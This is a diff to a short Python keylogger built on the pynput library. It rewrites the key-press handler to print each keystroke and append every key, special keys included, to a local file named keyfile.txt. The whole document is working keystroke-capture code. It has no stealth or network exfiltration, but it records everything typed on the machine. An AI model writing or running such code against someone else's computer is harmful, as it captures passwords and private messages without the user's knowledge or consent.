@@ -1,13 +1,19 @@
 from pynput import keyboard
 
 def keyPressed(key):
-    print(str(key))
-    with open("keyfile.txt",'a') as logkey:
-        try:
-            char = key.char
-            logkey.write(char)
-        except :
-            print("Error getting char")
+    try:
+        print(f'Key {key.char} pressed')
+    except AttributeError:
+        print(f'Special key {key} pressed')
+        with open("keyfile.txt",'a') as logkey:
+            logkey.write(f'Special key {key} pressed\n')
+    else:
+        with open("keyfile.txt",'a') as logkey:
+            logkey.write(f'Key {key.char} pressed\n')
+
+    return True
+
+
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed) # type: ignore
